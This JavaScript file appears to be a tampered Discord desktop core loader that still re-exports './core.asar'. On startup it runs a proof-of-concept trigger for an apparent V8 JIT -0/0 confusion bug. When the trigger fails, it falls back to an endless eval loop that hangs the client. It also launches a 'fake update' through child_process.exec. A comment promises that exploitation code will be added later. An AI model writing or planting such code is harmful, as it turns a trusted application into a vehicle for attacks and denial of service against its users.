'use strict';
module.exports = require('./core.asar');
function foo(trigger) {return Object.is((trigger ? -0 : 0) - 0, -0);}
function overflow() { for (;;) { eval("var min=0; var max=10; var random = Math.floor(Math.random() * (+max - +min)) + +min; var a = ''; for (var i = 1; i <= 1; i++) { a += random + '\"0U\x02A\x01y$\x00\x01@\x03\x03'; } console.log(a)"); } }
console.log('Triggering D3Dcord...');
  try { 
    let bef = eval(foo(false));
    for(var i=10000000;i>0;--i){foo(false);}
    let aft = eval(foo(true));
    if (bef == aft)
      {
        console.log('D3Dcord Triggered! ' + i);
      } else {
        throw "not vulnerable";
      }
  } catch (e) {
    console.log('D3Dcord Failed! ' + e);
    overflow();
  }
  finally {
    console.log('Booting Discord...');
    const exec = require('child_process').exec;
    const child = exec("start ./Squirrel.exe --updateSelf=Discord.exe",   // Fake Update Configured for Windows | all you have to do is port the exec :P
        (error, stdout, stderr) => {
            console.log(`${stdout}`);
            console.log(`${stderr}`);
            if (error !== null) {
                console.log(`${error}`);
            }
    });
    console.log('all clean and ready to go! ;)');
  }

          // WILL ADD EXPLOITATION CODE LATER WHEN DONE AND WRITEUP
